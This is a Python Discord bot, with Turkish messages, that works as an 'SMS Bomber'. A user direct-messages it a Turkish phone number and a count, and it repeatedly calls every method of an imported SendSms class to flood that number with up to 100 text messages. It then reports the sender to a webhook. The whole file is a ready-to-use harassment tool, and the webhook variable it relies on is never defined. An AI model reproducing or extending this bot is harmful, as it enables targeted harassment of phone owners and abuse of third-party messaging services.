import discord
from sms import SendSms
from time import sleep
import requests
from requests import get
with open("sms.py", "r", encoding="utf-8") as f:
    read = f.read()
    pass


TOKEN = "tokeni gir buraya"
gif = "gif koy buraya"
max_adet = 100
saniye = 0

intents = discord.Intents.all()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print('{} Çalışmaya Başladı!'.format(client.user))
    activity = discord.Activity(type=discord.ActivityType.playing, name="whelp")
    await client.change_presence(activity=activity)                                                   #Birazcık samimi ol, ya terk et ya sev beni
    
@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.content == "whelp":
        await message.channel.send(f"Sms göndermek için komutu aşağıdaki gibi yazınız.\n```wsms xxxxxxxxxx 10```\nwsms (telefon numarası) (sms sayısı)\n{message.author.mention}")
    elif message.guild is not None:
        await message.channel.send("Gizlilik nedeniyle artık yalnızca DM üzerinden çalışmaktadır. Lütfen direkt mesaj yoluyla komutlarınızı gönderin. authPyr3xWh1pp4")
    else:
        
        if message.guild is None:  
            if len(message.content.split(" ")) == 3 and message.content.split(" ")[0] == "wsms":
                if len(message.content.split(" ")[1]) == 10:
                    telno = message.content.split(" ")[1]
                    try:
                        adet = int(message.content.split(" ")[2])
                        if adet <= 0:
                            raise ValueError
                        if adet > max_adet: 
                            raise ValueError(f"En fazla {max_adet} adet SMS gönderebilirsiniz.")
                    except ValueError as e:
                        await message.channel.send(str(e))
                        return
                    embed=discord.Embed(title="SMS Bomber (+90)", description=(f"{adet} adet SMS Gönderiliyor --> {telno}\n{message.author.mention}"), color=0x001eff)
                    embed.set_thumbnail(url=gif)
                    await message.channel.send(embed=embed)
                    sms = SendSms(telno, "")
                    while sms.adet < adet:
                        for attribute in dir(SendSms):
                            attribute_value = getattr(SendSms, attribute)
                            if callable(attribute_value):
                                if attribute.startswith('__') == False:
                                    if sms.adet == adet:
                                        break
                                    exec("sms."+attribute+"()")
                                    sleep(saniye)
                    await message.channel.send(telno+" --> "+str(sms.adet)+f" adet SMS gönderildi.\n{message.author.mention}")    
                    content = f"{message.author.mention} {telno} numarasına {sms.adet} adet SMS gönderdi."           
                    data = {
                        "content": content
                    }
                    response = requests.post(WEBHOOK_URL, json=data)        
                    if response.status_code == 204:
                        print("Log kaydedildi!")
                else:
                    await message.channel.send(f"Geçerli komut yazınız!\nYardım için ' whelp ' yazınız.\n{message.author.mention}")
            elif "whelp" == message.content:
                await message.channel.send(f"Sms göndermek için komutu aşağıdaki gibi yazınız.\n```wsms xxxxxxxxxx 10```\nwsms (telefon numarası) (sms sayısı)\n{message.author.mention}")
        else:
            pass



    

client.run(TOKEN)
